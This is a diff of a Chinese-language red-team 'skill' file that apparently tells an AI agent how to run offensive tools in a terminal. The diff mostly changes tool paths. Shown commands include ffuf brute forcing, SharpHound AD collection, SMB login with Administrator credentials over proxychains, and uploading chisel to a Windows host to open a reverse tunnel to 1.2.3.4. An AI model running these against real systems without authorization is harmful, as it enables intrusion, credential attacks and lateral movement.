@@ -18,9 +18,24 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ---
 
+## 文件存储位置总览
+
+| 类型 | 目录位置 | 说明 |
+|------|----------|------|
+| 核心工具二进制/脚本 | `./tools/` | gogo/fscan/httpx/nuclei/ffuf/nxc/Responder 等 |
+| Impacket 脚本集合 | `./tools/impacket/` | getST.py、smbclient.py、wmiexec.py、psexec.py 等 |
+| 安装与分析脚本 | `./scripts/` | install_tools.py、proxy_setup.py、bloodhound_analysis.py |
+| 字典与爆破词库 | `./wordlists/` | 用户名、密码、子域、目录爆破字典 |
+| 帮助与参数说明 | `./tools/*_help.txt` | 本地离线参数参考 |
+| 扫描输出（建议） | `./results/` | 建议统一存放扫描结果与提取报告 |
+
+> 约定：优先使用相对路径（如 `./tools/xx.exe`），避免写死绝对路径导致迁移失败。
+
+---
+
 ##  工具一：gogo (极速资产与协议指纹探针)
 
-**二进制路径**: d:\mcp\tools\gogo.exe
+**二进制路径**: ./tools/gogo.exe
 
 **核心参数**（来自 gogo -h）：
 
@@ -46,7 +61,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具二：fscan (内网综合大杀器)
 
-**二进制路径**: d:\mcp\tools\fscan.exe
+**二进制路径**: ./tools/fscan.exe
 
 **核心参数**（来自 fscan -h）：
 
@@ -80,7 +95,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具三：httpx (高并发 HTTP 探针与指纹识别)
 
-**二进制路径**: d:\mcp\tools\httpx.exe
+**二进制路径**: ./tools/httpx.exe
 
 **核心参数**（来自 httpx -h）：
 
@@ -113,7 +128,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具四：nuclei (基于 YAML 模板的精确漏洞扫描器)
 
-**二进制路径**: d:\mcp\tools\nuclei.exe
+**二进制路径**: ./tools/nuclei.exe
 
 **核心参数**（来自 nuclei -h）：
 
@@ -153,7 +168,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具五：ffuf (超音速 HTTP Fuzzer)
 
-**二进制路径**: d:\mcp\tools\ffuf.exe
+**二进制路径**: ./tools/ffuf.exe
 
 **核心参数**（来自 ffuf -h）：
 
@@ -173,10 +188,10 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 **实战指令**:
 
   # 基础目录爆破
-  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -mc 200,301,302 -s
+  ffuf -u http://10.10.26.107:8080/FUZZ -w ./wordlists/web-content/common.txt -mc 200,301,302 -s
 
   # 带扩展名查备份文件
-  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -e .php,.bak,.zip,.sql -mc 200 -s
+  ffuf -u http://10.10.26.107:8080/FUZZ -w ./wordlists/web-content/common.txt -e .php,.bak,.zip,.sql -mc 200 -s
 
   # 过滤固定长度干扰
   ffuf -u http://target.com/FUZZ -w dict.txt -mc 200,301 -fs 1234 -s
@@ -188,7 +203,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具六：dnsx (DNS 解析与子域名枚举)
 
-**二进制路径**: d:\mcp\tools\dnsx.exe
+**二进制路径**: ./tools/dnsx.exe
 
 **实战指令**:
 
@@ -202,7 +217,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具七：kerbrute (Kerberos 用户枚举与密码喷洒)
 
-**二进制路径**: d:\mcp\tools\kerbrute.exe
+**二进制路径**: ./tools/kerbrute.exe
 
 **子命令**：
 
@@ -350,7 +365,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具八：SharpHound (AD 权限图谱收集 - Windows)
 
-**二进制路径**: d:\mcp\tools\SharpHound.exe
+**二进制路径**: ./tools/sharphound/SharpHound.exe
 
 > SharpHound 是 BloodHound 的官方 Windows 收集器，性能更优，支持更多 Windows 特有数据收集。
 > 适用于已获得 Windows 主机权限的场景，可直接在域内机器上运行。
@@ -1176,10 +1191,10 @@ run python -m impacket.examples...
 **完整工作流示例**：
 
   # 第一步：收集 AD 数据（使用 SharpHound）
-  SharpHound.exe -c All -d corp.local -o "d:\bh_collect"
+  SharpHound.exe -c All -d corp.local -o "./results/bh_collect"
 
   # 第二步：分析收集的数据
-  # AI 调用 impacket-bloodhound_analysis(data_path="d:\bh_collect")
+  # AI 调用 impacket-bloodhound_analysis(data_path="./results/bh_collect")
   # AI 将获得完整的攻击路径分析报告！
 
   # 报告示例：
@@ -1302,7 +1317,7 @@ proxychains4 nxc smb 10.10.10.50 -u Administrator -p 'Pass123!'
     target="192.168.1.100",
     username="Administrator",
     password="Pass123!",
-    local_file="d:\\mcp\\tools\\chisel.exe",
+    local_file="./tools/chisel.exe",
     remote_path="C:\\Windows\\Temp\\chisel.exe",
     exec_command="C:\\Windows\\Temp\\chisel.exe client 1.2.3.4:8080 R:8080"
   )
